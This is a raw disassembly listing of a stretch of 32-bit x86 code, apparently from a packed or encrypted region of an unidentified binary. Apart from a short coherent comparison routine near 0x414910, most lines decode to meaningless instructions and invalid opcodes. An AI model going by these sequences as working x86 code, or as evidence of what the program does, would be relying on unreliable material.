  414426:	test   DWORD PTR [eax],ecx
  414428:	push   ds
  414429:	fmul   st(3),st
  41442b:	cmp    eax,0x25e948ef
  414430:	pop    ss
  414431:	ret    0x1378
  414434:	and    eax,DWORD PTR [edx+0x2a]
  414437:	ja     0x4144aa
  414439:	jb     0x41441c
  41443b:	outs   dx,BYTE PTR ds:[esi]
  41443c:	pop    es
  41443d:	mov    ecx,0x4aa6a68d
  414442:	sbb    edx,DWORD PTR [edx-0x53e2c8c2]
  414448:	lods   al,BYTE PTR ds:[esi]
  414449:	sbb    ebp,eax
  41444b:	push   es
  41444c:	push   eax
  41444d:	stc    
  41444e:	jl     0x414454
  414450:	cmp    al,0x71
  414452:	sbb    dl,al
  414454:	inc    esi
  414455:	mov    ecx,ebp
  414457:	mov    al,ds:0x1d0aece
  41445c:	outs   dx,BYTE PTR ds:[esi]
  41445d:	jns    0x4144c1
  41445f:	jbe    0x414459
  414461:	jl     0x4143e3
  414463:	sbb    bh,0xb7
  414466:	mov    bl,0x4b
  414468:	jl     0x4144c5
  41446a:	or     al,0x72
  41446c:	xchg   esp,eax
  41446d:	and    BYTE PTR [edi],al
  41446f:	out    dx,eax
  414470:	sub    ah,BYTE PTR [eax]
  414472:	test   BYTE PTR [ebp-0x7],dl
  414475:	cs xor eax,0xf609c1e0
  41447b:	push   ebp
  41447c:	ss call 0x639ec51f
  414482:	dec    ebx
  414483:	add    cl,al
  414485:	push   ecx
  414486:	add    BYTE PTR [ecx+0x73fcf5d7],0x94
  41448d:	xchg   esi,eax
  41448e:	pop    ecx
  41448f:	dec    eax
  414490:	scas   al,BYTE PTR es:[edi]
  414491:	ret    0xc829
  414494:	sbb    eax,0x892698f4
  414499:	daa    
  41449a:	test   eax,0xc2306185
  41449f:	fs xchg esi,eax
  4144a1:	mov    esp,0xe1436289
  4144a6:	imul   edx,DWORD PTR [ebx-0x1f4efbd8],0x2fd639c2
  4144b0:	test   DWORD PTR [esi+0x5],ebx
  4144b3:	push   edi
  4144b4:	dec    edi
  4144b5:	cmc    
  4144b6:	mov    dh,0x6e
  4144b8:	sub    BYTE PTR [ebp+0x37],al
  4144bb:	stc    
  4144bc:	or     ch,cl
  4144be:	cmp    esi,DWORD PTR [ecx]
  4144c0:	or     ebx,DWORD PTR [ecx+0x5e]
  4144c3:	jmp    0x4144e0
  4144c5:	xor    BYTE PTR [edi],bh
  4144c7:	rcr    BYTE PTR [esi-0x74],cl
  4144ca:	jo     0x4144f8
  4144cc:	sub    DWORD PTR [esi-0x56],0xa3dc061b
  4144d3:	je     0x41452b
  4144d5:	hlt    
  4144d6:	pop    edi
  4144d7:	jae    0x414498
  4144d9:	sbb    al,0xe0
  4144db:	mov    dh,dh
  4144dd:	mov    eax,ds:0x22530545
  4144e2:	fldcw  WORD PTR [esi+0x599c2a4b]
  4144e8:	nop
  4144e9:	scas   eax,DWORD PTR es:[edi]
  4144ea:	pop    edx
  4144eb:	jg     0x4144a9
  4144ed:	dec    esi
  4144ee:	dec    edx
  4144ef:	add    ch,BYTE PTR [ecx-0x39d9bd77]
  4144f5:	bnd cs addr16 jbe 0x4144a5
  4144fa:	and    BYTE PTR [ebp-0x79],bl
  4144fd:	jp     0x414552
  4144ff:	pop    ds
  414500:	ficom  DWORD PTR [ebx-0x53]
  414503:	lahf   
  414504:	ror    DWORD PTR [ebx-0x2d940a0d],cl
  41450a:	lds    edx,FWORD PTR ds:0xbfe4cbd5
  414510:	in     al,0xbc
  414512:	cmc    
  414513:	add    DWORD PTR [eax-0x7],esi
  414516:	mov    edx,0x2ba0be5e
  41451b:	js     0x41455b
  41451d:	pop    esi
  41451e:	mov    bl,BYTE PTR ds:0x8659e3d6
  414524:	(bad)  
  414525:	nop
  414526:	ja     0x414557
  414528:	pop    edx
  414529:	repnz gs add eax,0x279097c3
  414530:	jge    0x4144bb
  414532:	and    eax,esi
  414534:	int3   
  414535:	out    0xde,al
  414537:	sti    
  414538:	cmp    eax,0x1d6eecb
  41453d:	dec    ebx
  41453e:	sbb    cl,BYTE PTR [esi]
  414540:	xor    esi,DWORD PTR [ecx+0x15992949]
  414546:	mov    bl,0xeb
  414548:	jecxz  0x41451c
  41454a:	sub    ebp,edi
  41454c:	shl    BYTE PTR [ecx+ebp*8],1
  41454f:	add    ebx,0xb08f2f63
  414555:	mov    al,0xcb
  414557:	xchg   DWORD PTR [eax+0x3e],esp
  41455a:	or     bl,BYTE PTR [eax+0x3a]
  41455d:	fst    DWORD PTR [esi]
  41455f:	inc    esp
  414560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414561:	arpl   WORD PTR [esi+0x18],si
  414564:	dec    edi
  414565:	xor    BYTE PTR [ebx-0x59],cl
  414568:	xchg   BYTE PTR [ecx+0x4a],ah
  41456b:	cmp    BYTE PTR [edi+0x26],bh
  41456e:	cmp    BYTE PTR [esi+0x2ebba720],al
  414574:	jle    0x414522
  414576:	jg     0x41454c
  414578:	jmp    0x31da3f49
  41457d:	adc    esp,DWORD PTR [ecx-0x38]
  414580:	addr16 int3 
  414582:	xor    eax,esi
  414584:	aas    
  414585:	inc    ebp
  414586:	int    0xbd
  414588:	test   BYTE PTR [ebp-0x6626e702],bh
  41458e:	icebp  
  41458f:	mov    esp,0x24149130
  414594:	mov    edi,0x9edf0b2d
  414599:	hlt    
  41459a:	mov    BYTE PTR [edx+0x1d],0x1a
  41459e:	pop    edi
  41459f:	mov    cl,0x84
  4145a1:	and    dh,BYTE PTR [edi-0x3e]
  4145a4:	mov    eax,ds:0x68f1a899
  4145a9:	nop
  4145aa:	pop    DWORD PTR [edi-0x3903a103]
  4145b0:	xchg   esp,eax
  4145b1:	out    dx,al
  4145b2:	fdiv   DWORD PTR [esi]
  4145b4:	jbe    0x41453a
  4145b6:	pushf  
  4145b7:	jno    0x414540
  4145b9:	mov    bl,0xfe
  4145bb:	test   BYTE PTR [ecx-0xa],ah
  4145be:	mov    al,ds:0x2256a429
  4145c3:	push   ecx
  4145c4:	loop   0x414641
  4145c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145c7:	push   0xfffffff7
  4145c9:	push   es
  4145ca:	push   eax
  4145cb:	add    ebp,DWORD PTR [eax]
  4145cd:	inc    ecx
  4145ce:	xchg   ebx,eax
  4145cf:	push   ss
  4145d0:	lods   eax,DWORD PTR ds:[esi]
  4145d1:	daa    
  4145d2:	add    BYTE PTR ds:0xf0710c7,bh
  4145d8:	ffreep st(3)
  4145da:	jns    0x4145f9
  4145dc:	xchg   edi,eax
  4145dd:	jbe    0x414634
  4145df:	loopne 0x4145fd
  4145e1:	(bad)  
  4145e3:	or     DWORD PTR cs:[eax-0x7b],esp
  4145e7:	add    al,0x68
  4145e9:	inc    edx
  4145ea:	cli    
  4145eb:	dec    ecx
  4145ec:	jp     0x4145dd
  4145ee:	cmp    DWORD PTR [ecx],esp
  4145f0:	test   eax,0xab17de64
  4145f5:	(bad)  
  4145f6:	jg     0x414664
  4145f8:	test   DWORD PTR [ebx+edi*8],ecx
  4145fb:	jecxz  0x414599
  4145fd:	mov    al,ds:0x2dfcb1c6
  414602:	xchg   edi,eax
  414603:	loopne 0x414638
  414605:	or     DWORD PTR [ebp+0x63],ebx
  414608:	mov    ch,0x6e
  41460a:	jg     0x4145e0
  41460c:	adc    edi,DWORD PTR [esi-0x17]
  41460f:	cld    
  414610:	jmp    0x414628
  414612:	imul   edi,DWORD PTR [eax],0x98904d36
  414618:	outs   dx,BYTE PTR ds:[esi]
  414619:	jae    0x4145ac
  41461b:	(bad)  
  41461c:	jnp    0x414684
  41461e:	mov    eax,ds:0x27c038ae
  414623:	repz mov cl,0xae
  414626:	or     esp,DWORD PTR [esi]
  414628:	cmp    al,0x37
  41462a:	nop
  41462b:	mov    edi,0x4a77eb10
  414630:	in     eax,0x66
  414632:	mov    WORD PTR [esi+0x760939a6],?
  414638:	xlat   BYTE PTR ds:[ebx]
  414639:	aas    
  41463a:	cdq    
  41463b:	pop    es
  41463c:	out    0x5b,eax
  41463e:	pop    ecx
  41463f:	mov    esp,DWORD PTR [ebx+0x66]
  414642:	inc    esi
  414643:	in     eax,0x7b
  414645:	mov    ecx,0x97d99acd
  41464a:	and    BYTE PTR [ecx],bl
  41464c:	scas   eax,DWORD PTR es:[edi]
  41464d:	cmp    DWORD PTR [edx-0x6f],ebp
  414650:	dec    esp
  414651:	enter  0xd6d4,0xa7
  414655:	jns    0x414670
  414657:	pop    esp
  414658:	ins    DWORD PTR es:[edi],dx
  414659:	sbb    DWORD PTR [eax-0x1127cdc7],0xffffffeb
  414660:	outs   dx,DWORD PTR ds:[esi]
  414661:	mov    eax,ds:0xc38a9c71
  414666:	out    0xee,al
  414668:	or     al,0x6e
  41466a:	imul   esi,DWORD PTR [ebx+0x54],0xffffff9c
  41466e:	inc    esi
  41466f:	xchg   ebx,eax
  414670:	or     DWORD PTR [ecx+0x76],edx
  414673:	cli    
  414674:	sbb    al,0xf0
  414676:	xchg   esp,eax
  414677:	jle    0x414645
  414679:	popf   
  41467a:	pop    es
  41467b:	jne    0x414634
  41467d:	cli    
  41467e:	push   ss
  41467f:	inc    ecx
  414680:	sbb    al,0x90
  414682:	sahf   
  414683:	imul   esp,DWORD PTR [esi+0x45],0xffffffd6
  414687:	dec    edi
  414688:	or     BYTE PTR [edx+0x573126e6],ch
  41468e:	retf   
  41468f:	jb     0x41467d
  414691:	jnp    0x414690
  414693:	push   esp
  414694:	in     al,dx
  414695:	leave  
  414696:	out    dx,al
  414697:	jle    0x4146e6
  414699:	mov    esi,0x582ab5b2
  41469e:	xor    eax,0xff20476b
  4146a3:	daa    
  4146a4:	repz lea eax,ss:[ebp+edx*1-0x7c2d1cde]
  4146ad:	push   es
  4146ae:	dec    esp
  4146af:	mul    DWORD PTR [ebx+0x44]
  4146b2:	in     eax,dx
  4146b3:	jge    0x414680
  4146b5:	ret    0xcba3
  4146b8:	mov    ebp,ebp
  4146ba:	ins    DWORD PTR es:[edi],dx
  4146bb:	sbb    BYTE PTR [ecx],ah
  4146bd:	pop    eax
  4146be:	lds    edx,FWORD PTR [ecx]
  4146c0:	sbb    esi,DWORD PTR [edi-0x44]
  4146c3:	jmp    DWORD PTR [ecx]
  4146c5:	add    eax,0xa5648eed
  4146ca:	inc    ecx
  4146cb:	fmul   QWORD PTR [bx+di]
  4146ce:	push   ecx
  4146cf:	out    0x5c,al
  4146d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146d2:	pop    ebx
  4146d3:	ds lahf 
  4146d5:	js     0x4146da
  4146d7:	push   esi
  4146d8:	retf   0x4747
  4146db:	fucompp 
  4146dd:	and    eax,DWORD PTR [eax+0x270e94e5]
  4146e3:	push   ebp
  4146e4:	sub    BYTE PTR [ecx],ch
  4146e6:	xlat   BYTE PTR ds:[ebx]
  4146e7:	push   ecx
  4146e8:	mov    edx,0xaee8ac68
  4146ed:	sub    al,0xc9
  4146ef:	rcr    BYTE PTR [esi+0xa0c9fc8],1
  4146f5:	cli    
  4146f6:	jnp    0x41469c
  4146f8:	dec    esp
  4146f9:	adc    DWORD PTR [edi],0x110d7e5e
  4146ff:	dec    edi
  414700:	sub    eax,0x8d8f4dd7
  414705:	xchg   esi,eax
  414706:	hlt    
  414707:	dec    ecx
  414708:	jp     0x414716
  41470a:	cmp    BYTE PTR [esi],dl
  41470c:	inc    ecx
  41470d:	sahf   
  41470e:	jns    0x414701
  414710:	outs   dx,DWORD PTR ds:[esi]
  414711:	pushf  
  414712:	mov    ah,0x4f
  414714:	cmp    DWORD PTR ds:[edx],edi
  414717:	test   al,0x95
  414719:	je     0x414754
  41471b:	sub    al,0x47
  41471d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41471f:	test   al,0xdf
  414721:	ins    BYTE PTR es:[edi],dx
  414722:	sar    esp,0xa8
  414725:	pusha  
  414726:	push   ebp
  414727:	iret   
  414728:	jnp    0x4146d5
  41472a:	lods   eax,DWORD PTR ds:[esi]
  41472b:	pop    ds
  41472c:	ins    BYTE PTR es:[edi],dx
  41472d:	sbb    DWORD PTR [ecx+0x1b],0x15
  414731:	xor    eax,0x67fbbbdd
  414736:	xor    eax,0x7d417f74
  41473b:	sub    ebp,DWORD PTR [ebx]
  41473d:	jne    0x4146f0
  41473f:	in     eax,0x83
  414741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414742:	icebp  
  414743:	mov    dl,0x44
  414745:	pop    esp
  414746:	loop   0x414768
  414748:	stos   BYTE PTR es:[edi],al
  414749:	rol    esi,cl
  41474b:	popa   
  41474c:	fld    QWORD PTR [eax+edx*2-0x59929ec3]
  414753:	js     0x4146e4
  414755:	push   ebp
  414756:	sbb    dl,ch
  414758:	mov    ds:0xe7c8d331,al
  41475d:	mov    ecx,0xcf80190f
  414762:	mov    ebp,0xecf5144f
  414767:	stos   DWORD PTR es:[edi],eax
  414768:	stc    
  414769:	popa   
  41476a:	fidivr WORD PTR [esi+0x7e]
  41476d:	(bad)  [ebp+0x74f35db1]
  414773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414774:	clc    
  414775:	sub    al,BYTE PTR [edi-0x23]
  414778:	push   ds
  414779:	js     0x414705
  41477b:	mov    bl,0x1f
  41477d:	es popf 
  41477f:	stc    
  414780:	test   eax,0x1cb43920
  414785:	imul   al
  414787:	inc    ebx
  414788:	rol    dl,1
  41478a:	ret    0xb582
  41478d:	shl    BYTE PTR [edi+0x1accbaac],cl
  414793:	jne    0x4147c5
  414795:	jns    0x4147dc
  414797:	(bad)  
  414798:	dec    eax
  414799:	out    0x5b,eax
  41479b:	shl    BYTE PTR [eax-0x7d804278],cl
  4147a1:	dec    edi
  4147a2:	xor    DWORD PTR [edx+0x53489461],0x67d66a4d
  4147ac:	xor    BYTE PTR [ebp-0x3e],0xa1
  4147b0:	mov    ds:0x96514bb3,al
  4147b5:	add    eax,0x5edcd9d8
  4147ba:	sbb    dh,BYTE PTR [edx+ecx*1-0x7f]
  4147be:	enter  0x36c6,0xe7
  4147c2:	inc    eax
  4147c3:	or     ebx,edi
  4147c5:	push   ds
  4147c6:	cmp    DWORD PTR [edi+0x14764f0d],esi
  4147cc:	out    dx,al
  4147cd:	(bad)  
  4147ce:	dec    DWORD PTR [esi]
  4147d0:	push   0xffffffc0
  4147d2:	xchg   ebx,eax
  4147d3:	inc    cx
  4147d5:	push   edx
  4147d6:	push   edi
  4147d7:	xchg   ecx,eax
  4147d8:	mov    al,ds:0xa03d663c
  4147dd:	int3   
  4147de:	push   esp
  4147df:	repz jle 0x414790
  4147e2:	push   edi
  4147e3:	and    al,0x9d
  4147e5:	dec    edi
  4147e6:	test   BYTE PTR [edi-0x2b995d48],al
  4147ec:	xchg   ebx,eax
  4147ed:	jae    0x41476f
  4147ef:	call   0x68f403cd
  4147f4:	push   ds
  4147f5:	mov    eax,ds:0xeed7f720
  4147fa:	jo     0x2c0b1bc9
  414800:	mov    ebp,0x350a4456
  414805:	ins    DWORD PTR es:[edi],dx
  414806:	lods   al,BYTE PTR ds:[esi]
  414807:	mov    ds:0xe6a2b1a7,eax
  41480c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480d:	adc    edx,edx
  41480f:	sub    ch,BYTE PTR [ebp-0x2c]
  414812:	ror    BYTE PTR [eax-0x26243832],cl
  414818:	mov    cl,0x66
  41481a:	xor    eax,0x235e6b7a
  41481f:	outs   dx,BYTE PTR ds:[esi]
  414820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414821:	sub    cl,BYTE PTR ds:0x55fe91ef
  414827:	jmp    FWORD PTR [eax+eiz*2-0x58b7cae4]
  41482e:	and    BYTE PTR [ebx],ah
  414830:	sbb    DWORD PTR [ebx+ebx*1],0x4c
  414834:	inc    edi
  414835:	mov    bh,0x6f
  414837:	nop
  414838:	mov    eax,ds:0x17ce33cc
  41483d:	stos   DWORD PTR es:[edi],eax
  41483e:	xor    BYTE PTR [eax-0x7726f7e7],bh
  414844:	pop    ds
  414845:	in     al,dx
  414846:	cs rcr esp,1
  414849:	loope  0x41481f
  41484b:	(bad)  
  41484c:	pop    ecx
  41484d:	(bad)  
  41484e:	enter  0x212a,0xf3
  414852:	or     BYTE PTR [ecx+0x4e08aa3c],bl
  414858:	nop
  414859:	sahf   
  41485a:	outs   dx,DWORD PTR ds:[esi]
  41485b:	je     0x41485d
  41485d:	out    0xf8,eax
  41485f:	cmc    
  414860:	ins    BYTE PTR es:[edi],dx
  414861:	jns    0x414814
  414863:	aam    0xe5
  414865:	jo     0x4147fa
  414867:	out    dx,eax
  414868:	add    al,0x93
  41486a:	lods   eax,DWORD PTR ds:[esi]
  41486b:	cmp    edx,DWORD PTR [edi]
  41486d:	mov    BYTE PTR ds:0x2565cdce,cl
  414873:	add    BYTE PTR [ebx-0x65],al
  414876:	outs   dx,BYTE PTR ds:[esi]
  414877:	std    
  414878:	repnz or BYTE PTR [ecx-0x39],al
  41487c:	adc    ah,BYTE PTR [ecx-0x4664919f]
  414882:	fadd   QWORD PTR [ecx]
  414885:	inc    edi
  414886:	imul   edi,DWORD PTR [ecx],0xb88c658e
  41488c:	jo     0x4148a7
  41488e:	sbb    al,0x69
  414890:	push   ss
  414891:	and    DWORD PTR [edi+edi*8+0x263dfb8f],ecx
  414898:	dec    DWORD PTR [edi-0xe9fd5d8]
  41489e:	adc    al,BYTE PTR [esi]
  4148a0:	sub    eax,DWORD PTR [edi+ebp*2-0x72]
  4148a4:	dec    esp
  4148a5:	nop
  4148a6:	xlat   BYTE PTR ds:[ebx]
  4148a7:	jg     0x41482e
  4148a9:	fidivr WORD PTR [esi]
  4148ab:	add    eax,0x41aa355
  4148b0:	mov    ebx,esp
  4148b2:	nop
  4148b3:	stc    
  4148b4:	mov    edi,DWORD PTR [edi+0x7c]
  4148b7:	or     al,0xdf
  4148b9:	xchg   esi,eax
  4148ba:	cmp    ah,BYTE PTR [edx+0x3538598f]
  4148c0:	sbb    al,0x59
  4148c2:	scas   eax,DWORD PTR es:[edi]
  4148c3:	push   edx
  4148c4:	jo     0x414943
  4148c6:	mov    ds:0xe119f15f,eax
  4148cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148cc:	sub    esi,DWORD PTR [ebx+0x3e]
  4148cf:	or     al,0xf4
  4148d1:	cmp    edx,DWORD PTR [eax-0x1a]
  4148d4:	cli    
  4148d5:	jbe    0x41486d
  4148d7:	sub    al,0x7c
  4148d9:	js     0x4148e8
  4148db:	popa   
  4148dc:	mov    WORD PTR [ebx+ebp*1-0x54575823],gs
  4148e3:	xchg   edx,eax
  4148e4:	lods   al,BYTE PTR ds:[esi]
  4148e5:	xchg   ebp,eax
  4148e6:	fidiv  DWORD PTR [esi]
  4148e8:	cwde   
  4148e9:	jmp    0x69888652
  4148ee:	jo     0x4148d5
  4148f0:	pop    es
  4148f1:	and    eax,0x63ecc8d4
  4148f6:	out    dx,al
  4148f7:	js     0x4148e0
  4148f9:	mov    ebx,0x329a434a
  4148fe:	sub    edi,edx
  414900:	push   0x850b9b78
  414905:	inc    ebp
  414906:	nop
  414907:	mov    BYTE PTR [ecx-0x4bc2995e],ch
  41490d:	adc    BYTE PTR [edx-0x69],al
  414910:	mov    edx,DWORD PTR [ebp-0xc]
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    dl,al
  414990:	stos   BYTE PTR es:[edi],al
  414991:	sti    
  414992:	cmp    BYTE PTR [esi-0x6c],cl
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	mov    ebp,0xb0938a25
  4149a0:	jno    0x4149fe
  4149a2:	leave  
  4149a3:	jne    0x414954
  4149a5:	outs   dx,BYTE PTR ds:[esi]
  4149a6:	sub    DWORD PTR [ecx],ecx
  4149a8:	pop    ebp
  4149a9:	cli    
  4149aa:	mov    dh,0x65
  4149ac:	mov    WORD PTR [esi+ecx*1+0xa],fs
  4149b0:	in     eax,dx
  4149b1:	push   esi
  4149b2:	dec    ecx
  4149b3:	and    DWORD PTR [edi+esi*4],edi
  4149b6:	xchg   esp,eax
  4149b7:	dec    eax
  4149b8:	daa    
  4149b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149ba:	dec    eax
  4149bb:	fild   QWORD PTR [edi-0x48]
  4149be:	fisub  DWORD PTR [ebp-0x58185069]
  4149c4:	fadd   st(6),st
  4149c6:	mov    ah,0x5b
  4149c8:	jne    0x414a3b
  4149ca:	xchg   edx,eax
  4149cb:	mov    eax,ds:0x9a2779
  4149d0:	imul   eax,ecx,0x4f
  4149d3:	push   edi
  4149d4:	js     0x414a45
  4149d6:	ss jae 0x414a58
  4149d9:	mov    WORD PTR fs:[ebp+ebx*4-0x38efd075],ss
  4149e1:	and    al,0xcb
  4149e3:	lods   eax,DWORD PTR ds:[esi]
  4149e4:	pusha  
  4149e5:	enter  0xf984,0xd
  4149e9:	dec    ebx
  4149ea:	dec    edx
  4149eb:	mov    ch,0x6a
  4149ed:	inc    ebp
  4149ee:	push   0x55
  4149f0:	push   0x64
  4149f2:	mov    edx,0xb7253d85
  4149f7:	repnz bound ebx,QWORD PTR ds:0x6f497e8c
  4149fe:	push   0x51
  414a00:	test   al,0x87
  414a02:	neg    bh
  414a04:	xchg   edx,eax
  414a05:	retf   
  414a06:	xchg   esp,eax
  414a07:	inc    ebx
  414a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a09:	cli    
  414a0a:	mov    ah,BYTE PTR [ebx+0x10]
  414a0d:	add    eax,0xce0f48ba
  414a12:	sbb    eax,0x813f9cee
  414a17:	fisubr DWORD PTR ds:0x785ee11b
  414a1d:	enter  0x638e,0x37
  414a21:	dec    ecx
  414a22:	into   
  414a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a24:	in     al,dx
  414a25:	aas    
  414a26:	inc    ebp
  414a27:	sub    al,0x5b
  414a2a:	aaa    
  414a2b:	cdq    
  414a2c:	inc    edi
  414a2d:	cmp    al,0x5
  414a2f:	sub    ebp,eax
  414a31:	xchg   esp,eax
  414a32:	loopne 0x4149f3
  414a34:	(bad)
  414a37:	pop    es
  414a38:	jl     0x414a10
  414a3a:	imul   BYTE PTR [esi+0x317457bc]
  414a40:	mov    al,0xa2
  414a42:	das    
  414a43:	or     DWORD PTR [edx+ebp*1+0x4a61dad2],ecx
  414a4a:	adc    eax,0xef70a642
  414a4f:	pop    ss
  414a50:	imul   esi,eax,0xce1457fc
  414a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a57:	test   al,0xea
  414a59:	neg    BYTE PTR [eax-0x3978893a]
  414a5f:	jmp    0x41a2db4d
  414a64:	test   al,0x78
  414a66:	xchg   BYTE PTR [ebx-0x4bf00e6a],dh
  414a6c:	jle    0x414acf
  414a6e:	mov    ecx,0xd8812aba
  414a73:	mov    ds:0x56571ff7,eax
  414a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a79:	out    dx,al
  414a7a:	dec    esp
  414a7b:	sar    DWORD PTR [edi],cl
  414a7d:	das    
  414a7e:	xchg   DWORD PTR [eax+edx*4],esp
  414a81:	or     al,0x78
  414a83:	pop    ebx
  414a84:	xor    DWORD PTR [esp+esi*1],ebx
  414a87:	fadd   QWORD PTR [ebx+0x60]
  414a8a:	add    ah,dh
  414a8c:	mov    esi,0xe485b7d6
  414a91:	dec    esi
  414a92:	je     0x414a45
  414a94:	stos   DWORD PTR es:[edi],eax
  414a95:	xor    ebp,DWORD PTR [edi+ebx*4]
  414a98:	jl     0x414a76
  414a9a:	test   ebp,esi
  414a9c:	test   eax,0x7faede70
  414aa1:	mov    dl,0x20
  414aa3:	fs xchg ebp,eax
  414aa5:	mov    eax,cs:0xb0880255
  414aab:	mov    ebx,DWORD PTR [ebp+edx*2-0x4c]
  414aaf:	cmp    edi,eax
  414ab1:	fcom   QWORD PTR [edx]
  414ab3:	push   0x8110db01
  414ab8:	push   ds
  414ab9:	xor    BYTE PTR [ebx-0x28],bl
  414abc:	daa    
  414abd:	push   eax
  414abe:	aad    0xa2
  414ac0:	fucom  st(6)
  414ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ac5:	out    0x3c,al
  414ac7:	popa   
  414ac8:	jne    0x414afb
  414aca:	icebp  
  414acb:	out    dx,al
  414acc:	or     DWORD PTR [ebx+edi*8],ecx
  414acf:	cld    
  414ad0:	mov    ds:0xf54bc4e3,al
  414ad5:	mov    BYTE PTR [esp+ebx*1],ch
  414ad8:	xor    BYTE PTR [ecx+0x79fe548],dh
  414ade:	push   0x19
  414ae0:	cmp    ebp,DWORD PTR [edx-0x11]
  414ae3:	sub    cl,BYTE PTR [ecx+0x27]
  414ae6:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae8:	adc    ebp,ebx
  414aea:	test   al,ah
  414aec:	mov    edi,esp
  414aee:	mov    edi,0x4463ad51
  414af3:	xchg   esi,eax
  414af4:	cdq    
  414af5:	mov    esi,ebx
  414af7:	js     0x414adb
  414af9:	pop    esp
  414afa:	xor    al,BYTE PTR [ebx-0x69]
  414afd:	lahf   
  414afe:	cmp    eax,0x8c518727
  414b03:	in     eax,0x41
  414b05:	cmc    
  414b06:	jecxz  0x414b87
  414b08:	pop    ds
  414b09:	dec    ebp
  414b0a:	fcmove st,st(1)
  414b0c:	cmp    al,0xe1
  414b0e:	loope  0x414b55
  414b10:	sub    al,0xa0
  414b12:	xor    DWORD PTR [ecx-0x14],esp
  414b15:	test   al,0xc1
  414b17:	repz xchg eax,esi
  414b1a:	push   cs
  414b1b:	pusha  
  414b1c:	into   
  414b1d:	sub    DWORD PTR cs:[edx-0x733d09bc],esp
  414b24:	or     eax,0x53e610d6
  414b29:	adc    BYTE PTR [ecx+0x2c7aabef],ch
  414b2f:	(bad)  
  414b30:	ss repnz inc ebp
  414b33:	cmp    ecx,DWORD PTR [eax]
  414b35:	int3   
  414b36:	jbe    0x414afc
  414b38:	inc    edi
  414b39:	inc    esp
  414b3a:	bound  eax,QWORD PTR [ebx]
  414b3c:	ror    BYTE PTR [ecx],1
  414b3e:	lahf   
  414b3f:	xlat   BYTE PTR ds:[ebx]
  414b40:	and    esp,ebx
  414b42:	cld    
  414b43:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b45:	clc    
  414b46:	data16 das 
  414b48:	xchg   BYTE PTR [ebx],dl
  414b4a:	test   DWORD PTR [esi-0x68],ebp
  414b4d:	xor    al,0xda
  414b4f:	stc    
  414b50:	jbe    0x414b0f
  414b52:	mov    eax,0x68fbbe75
  414b57:	sbb    eax,0x6165d581
  414b5c:	mov    ecx,0xb5ff55e4
  414b61:	clc    
  414b62:	or     ah,BYTE PTR [ebp-0x5d]
  414b65:	xchg   edx,eax
  414b66:	mov    ah,0x7a
  414b68:	add    DWORD PTR [edi],ebx
  414b6a:	cmc    
  414b6b:	les    ebp,FWORD PTR [ebx+ebx*2-0x5e65bef]
  414b72:	iret   
  414b73:	fdivr  QWORD PTR [eax]
  414b75:	jl     0x414bc0
  414b77:	lea    eax,[esi]
  414b79:	repz add DWORD PTR [ebx],eax
  414b7c:	jae    0x414b1e
  414b7e:	mov    bh,0xe4
  414b80:	or     edi,edi
  414b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b83:	push   esi
  414b84:	test   DWORD PTR ds:0x61aef8ee,edi
  414b8a:	sub    ah,al
  414b8c:	clc    
  414b8d:	dec    esp
  414b8e:	aas    
  414b8f:	test   BYTE PTR [edi],al
  414b91:	mov    edx,0xf9fffe14
  414b96:	in     al,0x17
  414b98:	lea    esi,[ebx+esi*1]
  414b9b:	sub    BYTE PTR [edi-0x2b7755b3],0xbb
  414ba2:	repnz dec eax
  414ba4:	addr16 sbb al,0x92
  414ba7:	mov    ebp,0xc9685f60
  414bac:	ret    0x5d14
  414baf:	mov    ch,0xd1
